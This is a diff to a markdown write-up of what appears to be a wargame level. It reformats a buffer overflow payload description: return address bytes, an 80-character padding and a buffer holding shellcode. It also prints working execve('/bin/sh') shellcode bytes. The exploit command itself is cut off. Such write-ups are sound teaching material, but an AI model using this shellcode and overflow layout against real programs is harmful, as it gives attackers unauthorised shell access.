@@ -148,12 +148,13 @@ This is a very convenient scenario to inject *shellcode* inside the unused secti
 ## Payload
 
 $$
-\begin{aligned}
-\text{Buffer1.address + 7} &= \text{"\textbackslash x47\textbackslash xa0\textbackslash x04\textbackslash x08"} \\
-\text{Buffer1} &= \text{"dat\_wil"} + \text{Shellcode} \\
-\text{Buffer2} &= \text{80 character padding} + \text{Buffer1.address + 7}
-\end{aligned}
+\begin{array}{rl}
+\text{Buffer1.address + 7} & = \textbackslash x47\textbackslash xa0\textbackslash x04\textbackslash x08 \\
+\text{Buffer1} & = dat\\_wil + \text{Shellcode} \\
+\text{Buffer2} & = \text{80 character padding} + (\text{Buffer1.address + 7})
+\end{array}
 $$
+
 
 ### Shellcode
 ```C
@@ -161,7 +162,7 @@ execve("/bin/sh", NULL, NULL) =
 "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 ```
 
-## Result
+### Command
 
 This one line command is able to run a shell as a level02 user.
 ```bash
